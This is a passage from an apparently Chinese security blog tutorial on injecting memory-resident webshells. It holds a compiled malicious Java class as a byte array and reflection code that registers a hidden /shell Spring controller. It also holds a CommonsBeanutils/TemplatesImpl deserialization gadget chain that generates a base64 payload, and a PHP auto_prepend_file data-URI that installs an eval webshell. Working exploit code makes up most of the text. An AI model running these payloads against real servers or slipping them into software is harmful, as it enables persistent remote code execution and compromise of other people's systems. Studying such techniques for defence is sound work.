class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">119</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">58</span>, <span class="number">0</span>, -<span class="number">93</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">18</span>, <span class="number">4</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">62</span>, <span class="number">29</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">83</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">58</span>, <span class="number">5</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">15</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">23</span>, <span class="number">58</span>, <span class="number">8</span>, <span class="number">44</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">8</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">44</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">1</span>, -<span class="number">108</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">78</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">76</span>, <span class="number">0</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, -<span class="number">97</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, -<span class="number">88</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, -<span class="number">85</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, -<span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, -<span class="number">101</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">31</span>, <span class="number">88</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">57</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">56</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">            java.lang.<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            defineClass.invoke(classLoader, className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获得当前代码运行时的上下文环境</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射获取RequestMappingHandlerMapping的config字段</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);</span><br><span class="line">            <span class="comment">//通过反射获得自定义controller中唯一的Method对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Class.forName(className).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置路由的请求方法为POST</span></span><br><span class="line">            <span class="type">RequestMethod</span> <span class="variable">requestMethod</span> <span class="operator">=</span> RequestMethod.POST;</span><br><span class="line">            <span class="comment">//在内存中动态注册 controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>).methods(requestMethod).options(config).build();</span><br><span class="line">            requestMappingHandlerMapping.registerMapping(info, Class.forName(className).newInstance(), method);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是生成字节码和生成序列化payload的Test代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(EvilController.class.getName()).toBytecode();</span><br><span class="line">        System.out.println(Arrays.toString(bytes).replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是执行结果，传入payload：</p><p><img src="https://pic.imgdb.cn/item/64d270e21ddac507cc0cc025.jpg" alt="image-20230808011049632"></p><p>之后进入&#x2F;shell，成功注入：</p><p><img src="https://pic.imgdb.cn/item/64d270f31ddac507cc0ce8bc.jpg" alt="image-20230808011106412"></p><h2 id="PHP-内存马"><a href="#PHP-内存马" class="headerlink" title="PHP 内存马"></a>PHP 内存马</h2><h3 id="注入方法："><a href="#注入方法：" class="headerlink" title="注入方法："></a>注入方法：</h3><p>目前PHP仍然是非常主流的服务端Web语言，只是网上很多文章还是更关注Java内存马，对PHP内存马的了解似乎只停留在PHP不死马。而PHP不死马一般存在文件落地不说，还非常容易被管理员发现，因此实在无法将它定义为内存马。</p><p>那我们怎样做不需要落地PHP文件就可以将我们的Webshell注入进服务器呢？其实方法很简单，还记得PHP有一个配置叫做auto_prepend_file吗？auto_prepend_file配置指定在主文件之前自动解析的文件名。假设此时我们拥有一个PHP网站的RCE漏洞，那么我们只需要修改auto_prepend_file的值为<code>data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</code>，接下来当我们每次访问别的PHP文件时都会自动解析<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>，然后就是传入shell参数进行RCE了。那假如我们没有RCE是不是就不行？其实不然，在某些情况可能我们只需要一个SSRF或者php-fpm未授权就可以完成PHP内存马的注入。</p><p>要了解这种注入手法，首先就要了解php-fpm是做什么的。php解释器和webserver进行通信时使用cgi协议，但是由于其每次都要开关进程，非常浪费资源，于是出现了fastcgi，利用一个进程一次处理多个请求。而php-fpm（php-Fastcgi Process Manager）就是fastcgi的实现，并提供了进程管理的功能。</p><p>以下是借用别的师傅的一张图：</p><p><img src="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923120208667.png" alt="image"></p><p>可以看到Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给php-fpm，FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>举个例子，用户访问<a href="http://127.0.0.1/index.php?a=1&b=2">http://127.0.0.1/index.php?a=1&b=2</a>，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: 